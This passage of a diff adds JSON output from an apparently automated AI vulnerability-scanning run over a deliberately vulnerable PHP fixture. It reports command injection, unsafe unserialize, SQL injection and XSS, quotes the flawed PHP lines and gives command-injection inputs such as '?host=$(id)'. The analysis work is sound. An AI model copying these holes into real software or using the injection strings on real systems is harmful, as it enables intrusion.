+              "Injection was established statically; no payload was executed against a running instance."
+            ],
+            "rationale": "web/vuln_cmd.php (4 lines, read in full) assigns $_GET['host'] to $host at line 2 and concatenates it into a double-quoted command string passed to shell_exec() at line 3, echoing stdout back. No escapeshellarg/escapeshellcmd, allowlist, or validation exists in the file or anywhere else in the PHP tree (grep for escapeshellarg|escapeshellcmd|shell_exec|system(|exec(|passthru over *.php returned only web/safe_cmd.php:2 and web/vuln_cmd.php:3). shell_exec runs via /bin/sh -c, so ';', '&', '|', '$()' and backticks permit arbitrary command execution with output returned in the response. Taint path is complete and unsanitized.",
+            "evidence_refs": [
+              "model-8dba793fe2e803f6-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-8dba793fe2e803f6",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:40:57.468269Z",
+            "metadata": {
+              "tool_calls_made": 7,
+              "total_tokens": 43072,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "computed"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-26bbeb61ecc17524",
+      "run_id": "run-1580e0037fac4a13944363313403b149",
+      "fingerprint": "26bbeb61ecc1752480fa88ddd4d22f63933b89716acfee1abb07f1b1d158ce76",
+      "title": "PHP object injection: unserialize() on attacker-controlled cookie",
+      "description": "unserialize() is applied directly to $_COOKIE['session'], so the attacker fully controls the serialized payload. This permits PHP object injection: instantiating arbitrary classes present in the codebase or autoloader to trigger magic methods (__wakeup/__destruct/__toString) as gadgets, chaining to file writes, SQL, or code execution; it also enables memory/CPU exhaustion via malformed or deeply nested input. The only prerequisite is setting a cookie on a request to this script.",
+      "cwe_category": "CWE-502",
+      "additional_cwe_labels": [],
+      "severity": "high",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-26bbeb61ecc17524-obs",
+          "run_id": "run-1580e0037fac4a13944363313403b149",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-502",
+          "severity": "high",
+          "native_severity": null,
+          "message": "unserialize() is applied directly to $_COOKIE['session'], so the attacker fully controls the serialized payload. This permits PHP object injection: instantiating arbitrary classes present in the codebase or autoloader to trigger magic methods (__wakeup/__destruct/__toString) as gadgets, chaining to file writes, SQL, or code execution; it also enables memory/CPU exhaustion via malformed or deeply nested input. The only prerequisite is setting a cookie on a request to this script.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "web/vuln_deser.php",
+            "language": "php",
+            "line_start": 2,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- web/vuln_deser.php (lines 1-3) ---\n1: <?php\n2: $session = unserialize($_COOKIE['session']);\n3: ?>"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:40:24.320010Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-26bbeb61ecc17524-obs"
+      ],
+      "created_at": "2026-11-25T13:40:24.320010Z",
+      "updated_at": "2026-11-25T13:40:24.320010Z",
+      "metadata": {
+        "title": "PHP object injection: unserialize() on attacker-controlled cookie",
+        "rationale": "unserialize() is applied directly to $_COOKIE['session'], so the attacker fully controls the serialized payload. This permits PHP object injection: instantiating arbitrary classes present in the codebase or autoloader to trigger magic methods (__wakeup/__destruct/__toString) as gadgets, chaining to file writes, SQL, or code execution; it also enables memory/CPU exhaustion via malformed or deeply nested input. The only prerequisite is setting a cookie on a request to this script.",
+        "evidence": "$session = unserialize($_COOKIE['session']);",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-26bbeb61ecc17524",
+          "finding_id": "model-26bbeb61ecc17524",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-26bbeb61ecc17524-model-26bbeb61ecc17524-obs",
+            "ev-model-26bbeb61ecc17524-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:42:26.997376Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "assessment_id": "assess-model-26bbeb61ecc17524-single",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-26bbeb61ecc17524-model-26bbeb61ecc17524-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-26bbeb61ecc17524-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-26bbeb61ecc17524-single",
+            "finding_id": "model-26bbeb61ecc17524",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": null,
+            "confidence": 0.93,
+            "assumptions": [
+              "The script is deployed and reachable by an HTTP client.",
+              "PHP's default unserialize() behavior (no allowed_classes option) applies, since no second argument is present.",
+              "Attacker can set the 'session' cookie on a request to this endpoint."
+            ],
+            "rationale": "web/vuln_deser.php:2 passes $_COOKIE['session'] straight into unserialize() with no allowed_classes restriction, type check, or signature validation, so the deserialization sink is reachable from a fully attacker-controlled source; this confirms CWE-502 object injection. Impact beyond the sink is not established by the excerpt: no gadget classes, autoloader, or downstream use of $session is shown, so RCE/file write/SQLi is possible but unproven.",
+            "evidence_refs": [
+              "model-26bbeb61ecc17524-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-26bbeb61ecc17524",
+            "model_id": "kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:41:10.348571Z",
+            "metadata": {
+              "single_shot": true,
+              "total_tokens": 1368,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "not_provided"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-cfe59861d98f28c2",
+      "run_id": "run-1580e0037fac4a13944363313403b149",
+      "fingerprint": "cfe59861d98f28c29301701bdbd28beb533627fbe09378b18c44c659dad5976f",
+      "title": "OS command injection via unsanitized user input passed to shell execution",
+      "description": "The vuln_cmd.php file is the deliberately vulnerable counterpart to safe_cmd.php. Command injection is the intended vulnerability for this file. However, no code contents were returned by any tool in this turn (list_files returned only filenames, and the secret scanner was skipped), so the exact sink line number, the tainted parameter name, and the code excerpt cannot be confirmed. Line 1 is the only defensible citation for the file; the finding is inferred from the file's name and its safe_cmd.php counterpart, not from inspected source. Treat the line and evidence as unverified until the file body is read.",
+      "cwe_category": "CWE-78",
+      "additional_cwe_labels": [],
+      "severity": "critical",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-cfe59861d98f28c2-obs",
+          "run_id": "run-1580e0037fac4a13944363313403b149",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-78",
+          "severity": "critical",
+          "native_severity": null,
+          "message": "The vuln_cmd.php file is the deliberately vulnerable counterpart to safe_cmd.php. Command injection is the intended vulnerability for this file. However, no code contents were returned by any tool in this turn (list_files returned only filenames, and the secret scanner was skipped), so the exact sink line number, the tainted parameter name, and the code excerpt cannot be confirmed. Line 1 is the only defensible citation for the file; the finding is inferred from the file's name and its safe_cmd.php counterpart, not from inspected source. Treat the line and evidence as unverified until the file body is read.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "web/vuln_cmd.php",
+            "language": "php",
+            "line_start": 1,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- web/vuln_cmd.php (lines 1-4) ---\n1: <?php\n2: $host = $_GET['host'];\n3: echo shell_exec(\"ping -c 1 \" . $host);\n4: ?>"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:40:24.323114Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-cfe59861d98f28c2-obs"
+      ],
+      "created_at": "2026-11-25T13:40:24.323114Z",
+      "updated_at": "2026-11-25T13:40:24.323114Z",
+      "metadata": {
+        "title": "OS command injection via unsanitized user input passed to shell execution",
+        "rationale": "The vuln_cmd.php file is the deliberately vulnerable counterpart to safe_cmd.php. Command injection is the intended vulnerability for this file. However, no code contents were returned by any tool in this turn (list_files returned only filenames, and the secret scanner was skipped), so the exact sink line number, the tainted parameter name, and the code excerpt cannot be confirmed. Line 1 is the only defensible citation for the file; the finding is inferred from the file's name and its safe_cmd.php counterpart, not from inspected source. Treat the line and evidence as unverified until the file body is read.",
+        "evidence": "unknown",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-cfe59861d98f28c2",
+          "finding_id": "model-cfe59861d98f28c2",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-cfe59861d98f28c2-model-cfe59861d98f28c2-obs",
+            "ev-model-cfe59861d98f28c2-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:42:26.997376Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "assessment_id": "assess-model-cfe59861d98f28c2-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-cfe59861d98f28c2-model-cfe59861d98f28c2-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-cfe59861d98f28c2-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-cfe59861d98f28c2-ai",
+            "finding_id": "model-cfe59861d98f28c2",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": {
+              "version": "4.0",
+              "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+              "base_score": 9.3,
+              "qualitative": "critical",
+              "source": "ai-proposal",
+              "notes": "",
+              "overall_score": 9.3,
+              "base_rating": "Critical",
+              "overall_rating": "Critical",
+              "nomenclature": "CVSS-B",
+              "calculation_source": "FIRST CVSS v4.0",
+              "metric_assumptions_verified": false
+            },
+            "confidence": 0.5,
+            "assumptions": [
+              "The file is reachable over HTTP as a PHP script; no reverse proxy or WAF filtering of the 'host' parameter is present in the snapshot (absence of evidence, not evidence of absence).",
+              "The PHP runtime has shell_exec() enabled and not listed in disable_functions; no php.ini is present in the snapshot to confirm this.",
+              "The process runs under a non-root web user, which limits blast radius but does not affect the injection's validity.",
+              "This appears to be a deliberately vulnerable sample repository given the sibling files (vuln_sql.php, vuln_xss.php, vuln_deser.php, safe_*.php); intent does not change the technical finding, but it likely means the code is not production-deployed."
+            ],
+            "rationale": "I verified the finding against the actual file body. The scanner's own note that the code was never inspected is now resolved, and the confirmed source contradicts part of its reasoning.\n\n**Confirmed evidence (web/vuln_cmd.php, all 4 lines read):**\n\n```php\n<?php\n$host = $_GET['host'];\necho shell_exec(\"ping -c 1 \" . $host);\n?>\n```\n\n- **Source:** line 2, `$_GET['host']` -- attacker-controlled query parameter, no type or format validation.\n- **Sink:** line 3, `shell_exec()` with string concatenation. No `escapeshellarg()`, `escapeshellcmd()`, or allowlist anywhere in the file or the repo (grep for sanitizers returned only the two `shell_exec` calls).\n- **Reachability:** a grep for `vuln_cmd`/`safe_cmd` across the snapshot found no includes, router, or front controller referencing it, so the file executes top-level on direct request as a standalone PHP script. No server config (`DocumentRoot`, `server_name`) exists in the snapshot to narrow exposure.\n- **Semgrep was skipped** (`semgrep not found on PATH`), so there is no independent SAST corroboration; the confirmation rests on direct source reading plus grep, which is sufficient for a 4-line file.\n\n**One correction to the scanner's rationale:** it justified the finding from the filename and the `safe_cmd.php` counterpart. That reasoning does not hold up. `safe_cmd.php` is `shell_exec(\"uname -a\")` -- a hardcoded constant with no user input. It is not a patched version of this code, so the \"deliberately vulnerable counterpart\" framing would have pointed at the wrong vulnerability class entirely. The finding is correct, but for the opposite reason: `vuln_cmd.php` is directly exploitable on its own terms, independent of any comparison.\n\n**Exploitability:** trivial. `?host=127.0.0.1;id` or `?host=$(id)` yields arbitrary command execution as the web server user. This is a textbook CWE-78 with no mitigating control observed.\n\n**What I could not determine:** the deployment context (whether this file is served from a public-fac",
+            "evidence_refs": [
+              "model-cfe59861d98f28c2-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-cfe59861d98f28c2",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:41:44.094910Z",
+            "metadata": {
+              "tool_calls_made": 9,
+              "total_tokens": 49808,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "computed"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-85029b008e0bf398",
+      "run_id": "run-1580e0037fac4a13944363313403b149",
+      "fingerprint": "85029b008e0bf398f49c755485a6f8f69a9efeb9875a06227978b3604a287f81",
+      "title": "Insecure deserialization of attacker-controlled data",
+      "description": "vuln_deser.php is the deliberately vulnerable counterpart in the set; insecure deserialization is its intended defect (likely unserialize() on request input). No file contents were returned by any tool in this turn, so the exact sink, the parameter, and the code excerpt are unconfirmed. The line number 1 is a placeholder citation for the file; verify by reading the source before treating this as a confirmed hit.",
+      "cwe_category": "CWE-502",
+      "additional_cwe_labels": [],
+      "severity": "critical",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-85029b008e0bf398-obs",
+          "run_id": "run-1580e0037fac4a13944363313403b149",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-502",
+          "severity": "critical",
+          "native_severity": null,
+          "message": "vuln_deser.php is the deliberately vulnerable counterpart in the set; insecure deserialization is its intended defect (likely unserialize() on request input). No file contents were returned by any tool in this turn, so the exact sink, the parameter, and the code excerpt are unconfirmed. The line number 1 is a placeholder citation for the file; verify by reading the source before treating this as a confirmed hit.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "web/vuln_deser.php",
+            "language": "php",
+            "line_start": 1,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- web/vuln_deser.php (lines 1-3) ---\n1: <?php\n2: $session = unserialize($_COOKIE['session']);\n3: ?>"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:40:24.326476Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-85029b008e0bf398-obs"
+      ],
+      "created_at": "2026-11-25T13:40:24.326476Z",
+      "updated_at": "2026-11-25T13:40:24.326476Z",
+      "metadata": {
+        "title": "Insecure deserialization of attacker-controlled data",
+        "rationale": "vuln_deser.php is the deliberately vulnerable counterpart in the set; insecure deserialization is its intended defect (likely unserialize() on request input). No file contents were returned by any tool in this turn, so the exact sink, the parameter, and the code excerpt are unconfirmed. The line number 1 is a placeholder citation for the file; verify by reading the source before treating this as a confirmed hit.",
+        "evidence": "unknown",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-85029b008e0bf398",
+          "finding_id": "model-85029b008e0bf398",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-85029b008e0bf398-model-85029b008e0bf398-obs",
+            "ev-model-85029b008e0bf398-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:42:26.997376Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "assessment_id": "assess-model-85029b008e0bf398-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-85029b008e0bf398-model-85029b008e0bf398-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-85029b008e0bf398-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-85029b008e0bf398-ai",
+            "finding_id": "model-85029b008e0bf398",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": null,
+            "confidence": 0.95,
+            "assumptions": [
+              "The snapshot (8 files under web/) is a reduced fixture and not the full deployed application; the gadget population of the production codebase is unknown and could raise impact to critical.",
+              "unserialize() is reachable over HTTP with the session cookie set by the client, i.e. no upstream WAF, cookie-signing layer, or reverse proxy strips or authenticates the cookie before PHP sees it. No such layer is visible in the snapshot.",
+              "No sanitizer, HMAC verification, or allowed_classes argument exists at the call site, confirmed by reading the full 3-line file."
+            ],
+            "rationale": "Direct source read of web/vuln_deser.php (3 lines total) confirms line 2: '$session = unserialize($_COOKIE['session']);'. Attacker-controlled cookie value flows into unserialize() with no validation, signature check, or allowed_classes restriction; source and sink are on the same line with no sanitizer on the path. The safe counterpart web/safe_json.php uses json_decode() on the same input, confirming this is the intended vulnerable member of the pair. Severity lowered from scanner's 'critical' to 'high' because no gadget chain (no class declarations, autoloaders, or __wakeup/__destruct/__toString methods) exists anywhere in the 8-file snapshot, so arbitrary code execution cannot be demonstrated from the available code, though direct object-injection impact and DoS remain reachable and a real deployment's autoloaded gadget surface is unknown.",
+            "evidence_refs": [
+              "model-85029b008e0bf398-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-85029b008e0bf398",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:41:56.161755Z",
+            "metadata": {
+              "tool_calls_made": 11,
+              "total_tokens": 48992,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "not_provided"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-a2fd9086db8a6354",
+      "run_id": "run-1580e0037fac4a13944363313403b149",
+      "fingerprint": "a2fd9086db8a635499e5dfaef0ae5135b06c4e0cd948b80b79179916d84c45f9",
+      "title": "SQL injection via unsanitized input in database query",
+      "description": "vuln_sql.php is the deliberately vulnerable counterpart to safe_sql.php; SQL injection is its intended defect (string-concatenated query rather than a prepared statement). No tool returned the file body this turn, so the vulnerable query line and parameter cannot be cited precisely. Line 1 stands in for the file; the evidence is unknown and the finding is inferred from filename and sibling file, not from inspected code.",
+      "cwe_category": "CWE-89",
+      "additional_cwe_labels": [],
+      "severity": "critical",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-a2fd9086db8a6354-obs",
+          "run_id": "run-1580e0037fac4a13944363313403b149",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-89",
+          "severity": "critical",
+          "native_severity": null,
+          "message": "vuln_sql.php is the deliberately vulnerable counterpart to safe_sql.php; SQL injection is its intended defect (string-concatenated query rather than a prepared statement). No tool returned the file body this turn, so the vulnerable query line and parameter cannot be cited precisely. Line 1 stands in for the file; the evidence is unknown and the finding is inferred from filename and sibling file, not from inspected code.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "web/vuln_sql.php",
+            "language": "php",
+            "line_start": 1,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- web/vuln_sql.php (lines 1-4) ---\n1: <?php\n2: $q = $_GET['q'];\n3: $res = mysqli_query($conn, \"SELECT * FROM products WHERE name = '\" . $q . \"'\");\n4: ?>"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:40:24.330474Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-a2fd9086db8a6354-obs"
+      ],
+      "created_at": "2026-11-25T13:40:24.330474Z",
+      "updated_at": "2026-11-25T13:40:24.330474Z",
+      "metadata": {
+        "title": "SQL injection via unsanitized input in database query",
+        "rationale": "vuln_sql.php is the deliberately vulnerable counterpart to safe_sql.php; SQL injection is its intended defect (string-concatenated query rather than a prepared statement). No tool returned the file body this turn, so the vulnerable query line and parameter cannot be cited precisely. Line 1 stands in for the file; the evidence is unknown and the finding is inferred from filename and sibling file, not from inspected code.",
+        "evidence": "unknown",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-a2fd9086db8a6354",
+          "finding_id": "model-a2fd9086db8a6354",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-a2fd9086db8a6354-model-a2fd9086db8a6354-obs",
+            "ev-model-a2fd9086db8a6354-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:42:26.998378Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "assessment_id": "assess-model-a2fd9086db8a6354-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-a2fd9086db8a6354-model-a2fd9086db8a6354-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-a2fd9086db8a6354-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-a2fd9086db8a6354-ai",
+            "finding_id": "model-a2fd9086db8a6354",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": {
+              "version": "4.0",
+              "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+              "base_score": 9.3,
+              "qualitative": "critical",
+              "source": "ai-proposal",
+              "notes": "",
+              "overall_score": 9.3,
+              "base_rating": "Critical",
+              "overall_rating": "Critical",
+              "nomenclature": "CVSS-B",
+              "calculation_source": "FIRST CVSS v4.0",
+              "metric_assumptions_verified": false
+            },
+            "confidence": 0.85,
+            "assumptions": [
+              "web/vuln_sql.php is served by a web server as a directly requestable PHP script under a document root (standard for .php files in a web/ directory), making $_GET['q'] attacker-reachable.",
+              "$conn resolves to a live mysqli connection at runtime via auto-prepend, an include absent from this snapshot, or global scope; without it the query fails, which would reduce exploitability but not remove the defect.",
+              "The finding is a deliberately vulnerable fixture (vuln_*/safe_* pairing), but no evidence shows it is isolated from a network-reachable deployment.",
+              "Impact on availability and on other systems depends on database privileges, driver support for stacked queries, and FILE privileges, none of which are observable in the snapshot."
+            ],
+            "rationale": "Direct inspection of web/vuln_sql.php confirms an unparameterized SQL query: $_GET['q'] (line 2) is concatenated verbatim into the SQL string passed to mysqli_query (line 3) inside a single-quoted literal, with no escaping, casting, or prepared statement. Full source-to-sink taint path is visible in a 4-line file with no sanitization barrier, so the CWE-89 defect is proven, not inferred. The sibling web/safe_sql.php uses a PDO prepared statement, confirming the vulnerable variant is the intended defect. Confidence is 0.85 rather than higher because (a) no router, entry point, or web-server configuration exists in the snapshot, so URL reachability of the file is unverified; (b) $conn is referenced but not defined in the file body; and (c) independent tool corroboration was unavailable -- Semgrep is not installed and CodeQL does not support PHP dataflow. Scanner evidence_strength of 'none' should be upgraded to confirmed source evidence with the correct location of line 3, not line 1.",
+            "evidence_refs": [
+              "model-a2fd9086db8a6354-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-a2fd9086db8a6354",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:41:55.160925Z",
+            "metadata": {
+              "tool_calls_made": 10,
+              "total_tokens": 49056,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "computed"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-a48bdbb0ebc0c939",
+      "run_id": "run-1580e0037fac4a13944363313403b149",
+      "fingerprint": "a48bdbb0ebc0c9391382cfaf86ffae266a37798993e46ac917bba6fef901bb08",
+      "title": "Reflected cross-site scripting via unescaped output of user input",
+      "description": "vuln_xss.php is the deliberately vulnerable counterpart to safe_xss.php; reflected XSS is its intended defect (echo of request data without htmlspecialchars or equivalent). No tool returned the file body this turn, so the exact echo statement and source parameter are unconfirmed. Line 1 is a placeholder; evidence is unknown.",
+      "cwe_category": "CWE-79",
+      "additional_cwe_labels": [],
+      "severity": "high",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-a48bdbb0ebc0c939-obs",
+          "run_id": "run-1580e0037fac4a13944363313403b149",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-79",
+          "severity": "high",
+          "native_severity": null,
+          "message": "vuln_xss.php is the deliberately vulnerable counterpart to safe_xss.php; reflected XSS is its intended defect (echo of request data without htmlspecialchars or equivalent). No tool returned the file body this turn, so the exact echo statement and source parameter are unconfirmed. Line 1 is a placeholder; evidence is unknown.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "web/vuln_xss.php",
+            "language": "php",
+            "line_start": 1,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- web/vuln_xss.php (lines 1-3) ---\n1: <?php\n2: echo \"<div>\" . $_GET[\"msg\"] . \"</div>\";\n3: ?>"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:40:24.334100Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-a48bdbb0ebc0c939-obs"
+      ],
+      "created_at": "2026-11-25T13:40:24.334100Z",
+      "updated_at": "2026-11-25T13:40:24.334100Z",
+      "metadata": {
+        "title": "Reflected cross-site scripting via unescaped output of user input",
+        "rationale": "vuln_xss.php is the deliberately vulnerable counterpart to safe_xss.php; reflected XSS is its intended defect (echo of request data without htmlspecialchars or equivalent). No tool returned the file body this turn, so the exact echo statement and source parameter are unconfirmed. Line 1 is a placeholder; evidence is unknown.",
+        "evidence": "unknown",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-a48bdbb0ebc0c939",
+          "finding_id": "model-a48bdbb0ebc0c939",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-a48bdbb0ebc0c939-model-a48bdbb0ebc0c939-obs",
+            "ev-model-a48bdbb0ebc0c939-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:42:26.998378Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
